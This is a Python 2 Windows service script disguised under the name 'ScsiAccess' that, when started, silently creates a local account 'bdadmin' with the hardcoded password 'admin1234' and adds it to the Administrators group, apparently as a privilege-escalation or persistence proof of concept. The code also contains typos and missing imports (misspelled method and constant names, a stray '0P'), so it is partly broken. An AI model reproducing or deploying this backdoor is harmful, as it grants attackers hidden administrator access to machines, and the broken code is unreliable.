import os, ctypes

import win32api
import servicemanager
import win32serviceutil
import win32service

class Service(win32serviceutil.ServiceFramework):
    _svc_name_ = 'ScsiAccess'
    _svc_display_name_ = 'ScsiAccess'
    
    
    def __init__(self, *args):
        win32serviceutil.ServiceFramework.__init__(self, *args)
        
    def sleep(self, sec):
        win32api.Sleep(sec*1000, True)
        
    def SvcDoRun(self):
        self.ReportSeriveStatus(win32service.SERVICE_START_PENDING)
        try:
            self.ReportServiceStatus(win32service.SERVICE_RUNNING)
            self.start()
        except Exception, x:
            self.SvcStop()
            
    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        self.stop()
        self.ReportServiceStatus(win32service.SERVICE_STOPED)
        
    def start(self):
        self.runflag=True
        
        '''
        fd = open('C:/Users/normaluser/Desktop/priv_test.txt', 'w')
        if ctypes.windll.shell32.IsUserAnAdmin() == 0P
            fd.write('[-] this is not admin user!')
        else:
            fd.write('[+] Admin user!')
        fd.close()    
        '''
        
        USER = "bdadmin"
        GROUP = "Administrators"
        user_info = dict (
            name = USER,
            password = "admin1234",
            priv = win32netcon.USER_PRIV_USER,
            home_dir = None,
            comment = None,
            flags = win32netcon.UF_SCRIPT,
            script_path = None
            )
        user_group_info = dict (
            domainname = USER
            )
        
        try:
            win32net.NetUserAdd(None, 1, user_info)
            win32net.NetLocalGroupAddMempbers (None, GROUP, 3, [user_group_info])
        except Exception, ex:
            pass
        
        
        
        while self.runflag:
            self.sleep(10)
            
    def stop(self):
        self.runflag=False
        
        
if __name__=='__main__':
    servicemanager.Initialize()
    servicemanager.PrepareToHostSingle(Service)
    servicemanager.StartServiceCtrlDispatcher()
    win32serviceutil.HandleCommandLine(Service)
